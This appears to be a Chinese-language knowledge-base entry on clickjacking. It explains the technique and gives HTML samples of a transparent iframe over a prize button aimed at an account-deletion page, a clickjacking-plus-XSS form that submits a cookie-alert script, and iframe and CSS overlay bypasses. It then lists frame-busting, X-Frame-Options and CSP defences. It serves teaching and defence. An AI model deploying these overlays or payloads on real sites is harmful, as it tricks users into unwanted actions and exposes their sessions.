knowledge: "# 点击劫持补充\n\n## 1. 基础点击劫持\n\n### 原理\n\n利用透明iframe覆盖在合法按钮上，诱导用户点击\n\n### 示例\n\n```html\n<html>\n<head>\n<title>Clickjack\
  \ Attack</title>\n</head>\n<body>\n  <iframe src=\"http://target.com/delete-account\" style=\"opacity:0; position:absolute;\
  \ top:0; left:0; width:100%; height:100%;\">\n  <button>Click to Win Prize!</button>\n</body>\n</html>\n```\n\n---\n\n##\
  \ 2. 点击劫持+XSS\n\n### 组合利用\n\n```html\n<iframe src=\"http://target.com/post\" style=\"opacity:0; position:absolute; top:0;\
  \ left:0;\">\n<form action=\"http://target.com/post\" method=\"POST\" id=\"pwn\">\n<input type=\"hidden\" name=\"content\"\
  \ value=\"<script>alert(document.cookie)</script>\">\n</form>\n<script>document.getElementById('pwn').submit();</script>\n\
  </iframe>\n```\n\n---\n\n## 3. 绕过技术\n\n### 多层iframe\n\n```html\n<iframe src=\"page1.html\" style=\"opacity:0\">\n  <iframe\
  \ src=\"page2.html\" style=\"opacity:0\">\n    <iframe src=\"target.html\">\n    </iframe>\n  </iframe>\n</iframe>\n```\n\
  \n### CSS覆盖\n\n```html\n<div style=\"position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999;\">\n  <button>Win\
  \ Prize!</button>\n</div>\n<iframe src=\"http://target.com/action\" style=\"opacity:0;\">\n```\n\n---\n\n## 4. 防御措施\n\n\
  ### Frame busting\n\n```javascript\nif (top !== self) {\n  top.location = self.location;\n}\n```\n\n### X-Frame-Options\n\
  \n```\nX-Frame-Options: DENY\nX-Frame-Options: SAMEORIGIN\nX-Frame-Options: ALLOW-FROM https://example.com\n```\n\n### CSP\n\
  \n```\nContent-Security-Policy: frame-ancestors 'self';\n```\n"
